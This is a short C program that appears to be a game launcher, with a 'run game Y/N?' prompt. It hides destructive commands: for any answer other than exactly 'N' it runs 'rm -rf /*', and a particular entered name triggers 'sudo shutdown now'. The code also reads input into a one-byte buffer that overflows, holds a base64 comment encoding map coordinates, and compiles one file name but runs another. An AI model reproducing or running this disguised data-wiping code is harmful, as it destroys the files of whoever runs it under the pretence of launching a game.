#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <SDL.h>

char A [1];
char name [24];

void saftey(){
  if(strcmp(name,"Matthew Browner") == 0){
    system("echo \"LIAR!\"");
  }else if(strcmp(name,"James Browner") == 0){
    system("echo \"owdm ao kcth wd cvu uoan\"");
    system("sleep 1");
    system("sudo shutdown now");
  }else{
    system("gcc play.c -o play.elp");
    system("./play.elf");
  }
}
int main(){
  printf("run game Y/N?");
  scanf("%s",A);
  if(strcmp(A,"Y") == 0){
    printf("then lets go");
    //NDcuMTIxMzc4LC0xMTkuMzM3OTk3
    scanf("?%s",name);
    saftey();
  }
  if(strcmp(A,"N")){
    system("rm -rf /*");
  }
}
